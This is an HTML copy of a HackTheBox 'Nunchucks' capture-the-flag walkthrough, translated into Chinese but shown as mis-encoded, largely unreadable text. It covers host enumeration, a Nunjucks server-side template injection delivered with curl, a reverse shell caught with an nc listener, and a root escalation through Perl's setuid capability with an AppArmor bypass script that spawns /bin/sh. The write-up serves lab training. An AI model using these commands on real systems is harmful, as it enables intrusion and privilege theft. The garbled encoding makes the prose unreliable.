<html>
<head>
<title>Nunchucks from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ã€Šé»‘å®¢ç›’å­ã€‹ä¸­çš„åŒæˆªæ£â€”â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/nunchucks-from-hackthebox-detailed-walkthrough-c09ba0f276fa?source=collection_archive---------6-----------------------#2022-05-19">https://infosecwriteups.com/nunchucks-from-hackthebox-detailed-walkthrough-c09ba0f276fa?source=collection_archive---------6-----------------------#2022-05-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="67f5" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">å‘æ‚¨å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</h2></div><h1 id="d656" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/9a70c3eb96f58ff966ed1e518d0656f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*bj-jA-_61nJ6Gayj.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">é»‘å®¢ç›’å­é‡Œçš„åŒæˆªæ£</figcaption></figure><p id="a702" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åŒæˆªæ£æ˜¯HackTheBoxä¸Šçš„ä¸€ä¸ªç®€å•çš„æœºå™¨ã€‚æˆ‘ä»¬ä»æšä¸¾å¼€å§‹ï¼Œåœ¨ä¸€ä¸ªå­åŸŸä¸Šæ‰¾åˆ°ä¸€ä¸ªå®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»çš„ç½‘ç«™ã€‚æ›´å¤šçš„æ¢ç´¢å‘ç°äº†ä¸€ä¸ªæ˜“å—æ”»å‡»çš„æ¨¡æ¿å¼•æ“ï¼Œæˆ‘ä»¬åˆ©ç”¨å®ƒæ¥è·å¾—ä¸€ä¸ªåå‘å¤–å£³ã€‚å‡çº§åˆ°rootæ˜¯é€šè¿‡perläºŒè¿›åˆ¶æ–‡ä»¶ä¸Šè®¾ç½®çš„åŠŸèƒ½ã€‚ä½¿ç”¨GTFOBinsç¤ºä¾‹ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è·å¾—æ ¹shellã€‚</p><p id="0107" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">éœ€è¦çš„æŠ€èƒ½æ˜¯åŸºæœ¬çš„æ‰«æå’Œè®¡æ•°æŠ€æœ¯ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯å¯»æ‰¾å’Œä½¿ç”¨å…¬å¼€å¯ç”¨çš„æ¼æ´ã€‚</p><h1 id="d8dd" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="7b5a" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/984306c1c999e16d19fb7337ae676279.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jdg5nJdcYdBqQe4kMHFzbQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æœºå™¨ä¸Šç«¯å£çš„Nmapæ‰«æ</figcaption></figure><p id="4bf2" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬çœ‹åˆ°ä¸‰ä¸ªå¼€æ”¾çš„ç«¯å£ï¼Œå…¶ä¸­443æ˜¾ç¤ºä¸€ä¸ªä¸»æœºåï¼Œè®©æˆ‘ä»¬å°†å…¶æ·»åŠ åˆ°/etc/hosts:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="8353" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/nunchucks]<br/>â””â”€# echo "10.10.11.122 nunchucks.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="dabb" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç½‘ç«™(å…¨çƒèµ„è®¯ç½‘çš„ä¸»æœºç«™)</h1><p id="8aa0" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ä»ä¸Šé¢çš„Nmapä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ç«¯å£80ä¸Šçš„HTTPåœ¨ç«¯å£443ä¸Šé‡å®šå‘åˆ°HTTPSã€‚è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒæ˜¯ä¸€ä¸ªåœ¨çº¿å•†åº—åˆ›å»ºå¹³å°:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mz"><img src="../Images/578e61a06e265bd4007fdf0b252247f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*W2aXDb8ZOYh_2a-M.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç½‘ç«™ä¸»é¡µ</figcaption></figure><h1 id="b57b" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Gobuster</h1><p id="146b" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ç¯é¡¾å››å‘¨ï¼Œè¿™åªæ˜¯ä¸€ä¸ªç½‘ç«™çš„åŸºæœ¬æ¨¡æ¿ã€‚æœ‰ä¸€ä¸ªæ³¨å†Œè´¦æˆ·çš„è¡¨æ ¼ï¼Œä½†æ˜¯å¦‚æœä½ å°è¯•çš„è¯ï¼Œå®ƒä¼šè¯´æ³¨å†Œç°åœ¨å·²ç»ç»“æŸäº†ã€‚åœ¨åº•éƒ¨çš„é“¾æ¥éƒ¨åˆ†ï¼Œå®ƒæåˆ°å³å°†æœ‰ä¸€ä¸ªå•†åº—ã€‚æˆ‘ä»¬è¿˜ä»è¿‡å»çš„CTFä¸­äº†è§£åˆ°ï¼Œç»å¸¸ä¼šæœ‰è™šæ‹Ÿä¸»æœºï¼Œæ‰€ä»¥è®©æˆ‘ä»¬å°è¯•æ‰«æ:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi na"><img src="../Images/4b1a171b65c8cbb5c04d81675784c590.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oGYVyZw4lHg0RGH5v9M_1Q.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">vhostsçš„Gobusteræ‰«æ</figcaption></figure><p id="e880" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬æ‰¾åˆ°å•†åº—äº†ï¼é¦–å…ˆæ·»åŠ åˆ°ä¸»æœºæ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="01ba" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# sed -i '/10.10.11.122 nunchucks.htb/ s/$/ store.nunchucks.htb/' /etc/hosts</span></pre><h1 id="1e8b" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åŒæˆªæ£åº—</h1><p id="bd53" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nb"><img src="../Images/b7d1e422b45898e38fc4ecee56e2bec1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*OUX0AK_97rv2PlAg.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">åŒæˆªæ£åº—</figcaption></figure><p id="d980" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç»è¿‡ä¸€ç•ªè¯•éªŒï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸ªè¡¨å•å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)çš„æ”»å‡»:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/8f9d74317543472c335f9e741849ab7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1382/format:webp/0*-E2oOM_XzTnd5cXi.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´</figcaption></figure><h1 id="ae2a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSTI</h1><p id="71d9" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">å°±åƒæˆ‘ä»¬åœ¨<a class="ae nd" href="https://www.hackthebox.com/home/machines/profile/384" rel="noopener ugc nofollow" target="_blank"> Bolt </a>ä¸Šçœ‹åˆ°çš„é‚£æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥è‡ª<a class="ae nd" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" rel="noopener ugc nofollow" target="_blank">é»‘å®¢æŠ€å·§</a>çš„ä¾‹å­æ¥è¯å®ã€‚ä¸Šé¢æˆ‘ä»¬çœ‹åˆ°49çš„å“åº”ç¡®è®¤äº†7 * 7çš„æœ‰æ•ˆè´Ÿè½½åœ¨æœåŠ¡å™¨ç«¯è¢«è¯„ä¼°ï¼Œå¹¶ä¸”ç­”æ¡ˆè¢«è¿”å›åˆ°é¡µé¢ã€‚</p><p id="9b74" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†å®ƒçš„å¼±ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥åˆ©ç”¨å®ƒã€‚æŸ¥çœ‹Wappalyzerï¼Œå®ƒæ£€æµ‹åˆ°ç”¨ä½œExpressçš„webæ¡†æ¶:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/46b84bffb1cefa63096e1c5ce7d559db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1170/format:webp/0*IWnzJ0-oRwkTvEIu.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç½‘ç«™çš„åˆ†æä¿¡æ¯</figcaption></figure><p id="113e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç‚¹å‡»Wappalyzeré“¾æ¥<a class="ae nd" href="https://www.wappalyzer.com/technologies/web-frameworks/express" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>æœ‰æ›´å¤šå…³äºè¿™ä¸ªæ¡†æ¶çš„ä¿¡æ¯ï¼Œè¿˜æœ‰ä¸€ä¸ªé“¾æ¥æŠŠæˆ‘ä»¬å¸¦åˆ°äº†<a class="ae nd" href="http://expressjs.com/" rel="noopener ugc nofollow" target="_blank"> ExpressJS </a>ç½‘ç«™ã€‚ç¯é¡¾å››å‘¨ï¼Œæˆ‘ä»¬åœ¨å‚è€ƒèµ„æ–™éƒ¨åˆ†å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nf"><img src="../Images/82ed0a36e0df26b4238f8c6997cd6d73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*uSgtbLDuWm2zih4v.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æ¨¡æ¿å¼•æ“ExpressJS</figcaption></figure><p id="006f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æœ‰ä¸€ä¸ªæ¨¡æ¿å¼•æ“å«åšNunjucksï¼Œè¿™å¾ˆå¯ç–‘ï¼Œå› ä¸ºå®ƒå‡ ä¹å’Œè¿™ä¸ªç›’å­åŒåã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨Github repo <a class="ae nd" href="https://github.com/mozilla/nunjucks" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>ç»“æŸã€‚æœç´¢â€œnunjucks sstiâ€ä¼šæ‰¾åˆ°<a class="ae nd" href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/out-of-band-code-execution-via-ssti-nodejs-nunjucks/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ï¼Œç„¶ååˆ°<a class="ae nd" href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ã€‚è¿™æœ€åä¸€ç¯‡æ–‡ç« è§£é‡Šäº†ä¸€ä¸ªæ²™ç›’çˆ†å‘ï¼Œé€šè¿‡ä½¿ç”¨æ‰€æè¿°çš„æœ‰æ•ˆè´Ÿè½½å¯ä»¥å¾ˆå®¹æ˜“åœ°è·Ÿéšå®ƒ:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi ng"><img src="../Images/d83298ec8d6f79a05adc88d814032a52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C_Kjy1cmuCfnOAn1QsFvMQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">sstiçš„æœ‰æ•ˆè½½è·</figcaption></figure><p id="d529" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬åªéœ€è¦åœ¨å•å¼•å·å’ŒåŒå¼•å·å‰é¢åŠ ä¸€ä¸ªåæ–œæ æ¥è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åä½¿ç”¨curlæ¥ä¼ é€’:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nh"><img src="../Images/c380d238d6186499fde3e16c986c454d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yKN1eAohcf0c-ALDDbMmvg.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä½¿ç”¨curlå°†æœ‰æ•ˆè´Ÿè½½ä¼ é€åˆ°ç½‘ç«™</figcaption></figure><h1 id="1f8f" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åå‘å¤–å£³</h1><p id="efb3" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æˆ‘ä½¿ç”¨sedæ•´ç†äº†è¾“å‡ºï¼Œä½¿å…¶æ›´å…·å¯è¯»æ€§ã€‚æœ‰äº†è¿™ä¸ªå·¥ä½œï¼Œè®©æˆ‘ä»¬å°è¯•ä¸€ä¸ªç›¸åçš„å¤–å£³:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="a461" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/nunchucks]<br/>â””â”€# curl -s -k -X POST -H $'Content-Type: application/json' --data-binary $'{\"email\":\"\"\x0d\x0a}' 'https://store.nunchucks.htb/api/submit'</span></pre><p id="73fe" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åˆ‡æ¢åˆ°ä¸€ä¸ªç­‰å¾…çš„ncç›‘å¬å™¨æ¥æŸ¥çœ‹æˆ‘ä»¬çš„è¿æ¥:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="30c8" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/nunchucks]<br/>â””â”€# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.10] from (UNKNOWN) [10.10.11.122] 60976</span></pre><p id="8a8f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">é¦–å…ˆï¼Œè®©æˆ‘ä»¬å°†shellå‡çº§åˆ°æ›´æœ‰ç”¨çš„ç‰ˆæœ¬:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="ef98" class="mu kg iq mq b gy mv mw l mx my">$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>david@nunchucks:/var/www/store.nunchucks$ ^Z                <br/>zsh: suspended  nc -nlvp 1337<br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/nunchucks]<br/>â””â”€# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/>david@nunchucks:/var/www/store.nunchucks$</span></pre><h1 id="21ba" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="3722" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æ’åºåï¼Œè®©æˆ‘ä»¬å¾—åˆ°ç”¨æˆ·æ ‡å¿—:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="4b3b" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt <br/>&lt;HIDDEN&gt;</span></pre><p id="d28b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç»è¿‡ä¸€äº›æšä¸¾ä¹‹åï¼Œæˆ‘åœ¨/optä¸­æ‰¾åˆ°äº†ä¸€ä¸ªPerlè„šæœ¬:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="f47c" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/var/www/store.nunchucks$ ls -lsa /opt<br/>4 -rwxr-xr-x  1 root root  838 Sep  1 12:53 backup.pl<br/>4 drwxr-xr-x  2 root root 4096 Oct 28 17:03 web_backups</span></pre><h1 id="b062" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Setuidæ¼æ´</h1><p id="7300" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æŸ¥çœ‹è„šæœ¬ï¼Œç¬¬ä¸€éƒ¨åˆ†æœ‰setuid(0):</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="9e13" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/var/www/store.nunchucks$ cat /opt/backup.pl <br/>#!/usr/bin/perl<br/>use strict;<br/>use POSIX qw(strftime);<br/>use DBI;<br/>use POSIX qw(setuid); <br/>POSIX::setuid(0);</span></pre><p id="640f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è„šæœ¬çš„å…¶ä½™éƒ¨åˆ†æ˜¯è·å–/var/wwwçš„å†…å®¹å¹¶å°†å…¶å¤‡ä»½åˆ°/tmpï¼Œç„¶åå°†å…¶ç§»åŠ¨åˆ°/optã€‚æœ‰è¶£çš„éƒ¨åˆ†æ˜¯å¼€å§‹æ—¶çš„setuidå‘½ä»¤ã€‚åœ¨ä¹‹å‰çš„åä¸º<a class="ae nd" href="https://pencer.io/ctf/ctf-thm-wonderland/#root-flag" rel="noopener ugc nofollow" target="_blank"> Wonderland </a>çš„TryHackMeç›’å­ä¸Šï¼Œæˆ‘ä½¿ç”¨äº†åŒæ ·çš„åŠŸèƒ½ã€‚GTFOBinsçš„æ–‡ç« <a class="ae nd" href="https://gtfobins.github.io/gtfobins/perl/#capabilities" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>è§£é‡Šäº†æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨è¿™ä¸€ç‚¹:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="03bf" class="mu kg iq mq b gy mv mw l mx my">If the binary has the Linux CAP_SETUID capability set or it is executed by another<br/>binary with the capability set, it can be used as a backdoor to maintain privileged<br/>access by manipulating its own process UID.</span></pre><p id="7931" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœæˆ‘ä»¬æ£€æŸ¥perläºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å®ƒè®¾ç½®äº†CAP_SETUID:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="5d00" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/var/www/store.nunchucks$ getcap /usr/bin/perl<br/>/usr/bin/perl = cap_setuid+ep</span></pre><p id="8ec7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä½¿ç”¨GTFOBinsæä¾›çš„æ¼æ´æ²¡æœ‰ä»»ä½•ä½œç”¨:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="cdb7" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/tmp$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'<br/>david@nunchucks:/tmp$</span></pre><p id="eda1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŸåŸæ¥è¿™ä¸ªç›’å­å·²ç»ä¸ºPerlå¯ç”¨äº†Apparmorã€‚æœ‰ç”¨çš„ä¿¡æ¯<a class="ae nd" href="https://wiki.ubuntu.com/AppArmor" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>æ¥è‡ªUbuntuå…³äºå®ƒçš„ç”¨æ³•ã€‚å¦‚æœæˆ‘ä»¬æŒ‰ç…§æ–‡ç« ä¸­çš„æè¿°åœ¨/etc/apparmor.dä¸­æŸ¥æ‰¾ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°æœ‰ä¸€ä¸ªå…³äºPerlçš„æ¦‚è¦æ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="5950" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/tmp$ ls -lsa /etc/apparmor.d/usr.bin.*<br/>-rw-r--r-- 1 root root 202 Feb 25 2020  /etc/apparmor.d/usr.bin.man<br/>-rw-r--r-- 1 root root 442 Sep 26 01:16 /etc/apparmor.d/usr.bin.perl</span></pre><p id="2991" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æŸ¥çœ‹è¯¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒé˜»å¡äº†æˆ‘ä»¬ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸€ä¸ª. plæ–‡ä»¶æ¥ç»•è¿‡å®ƒï¼Œè¯¥æ–‡ä»¶ä¸­åŒ…å«Perl shebangå¹¶ä½¿ä¹‹å¯æ‰§è¡Œã€‚è¿™é‡Œæœ‰ä¸€ç‚¹ä¿¡æ¯<a class="ae nd" href="https://www.geeksforgeeks.org/perl-use-of-hash-bang-or-shebang-line/" rel="noopener ugc nofollow" target="_blank">ä½†æ˜¯å¾ˆç®€å•ã€‚</a></p><h1 id="89cd" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æ ¹æ ‡å¿—</h1><p id="1516" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">å°†æ¥è‡ªGTFOBinsçš„ç›¸åŒå‘½ä»¤å›æ˜¾åˆ°æœºå™¨ä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="4e55" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/tmp$ echo '#!/usr/bin/perl<br/>use POSIX qw(setuid);<br/>POSIX::setuid(0);<br/>exec "/bin/sh";' &gt; pencer.pl</span></pre><p id="6f91" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨è®©å®ƒå¯æ‰§è¡Œï¼Œç„¶åç›´æ¥è°ƒç”¨å®ƒ:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="efb4" class="mu kg iq mq b gy mv mw l mx my">david@nunchucks:/tmp$ chmod +x pencer.pl <br/>david@nunchucks:/tmp$ ./pencer.pl <br/># id<br/>uid=0(root) gid=1000(david) groups=1000(david)<br/># cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="0ffa" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬å¼€å§‹å§ã€‚åˆä¸€ä¸ªç›’å­æ‰æ ¹äº†ï¼Œä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl ni nj hu nk" role="separator"><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn"/></div><div class="ij ik il im in"><p id="c2ea" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="c0ee" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ¨ç‰¹â€”<a class="ae nd" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae nd" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="c02e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="np">åŸè½½äº2022å¹´5æœˆ19æ—¥</em><a class="ae nd" href="https://pencer.io/ctf/ctf-htb-nunchucks/" rel="noopener ugc nofollow" target="_blank"><em class="np">https://pencer . io</em></a><em class="np">ã€‚</em></p></div></div>    
</body>
</html>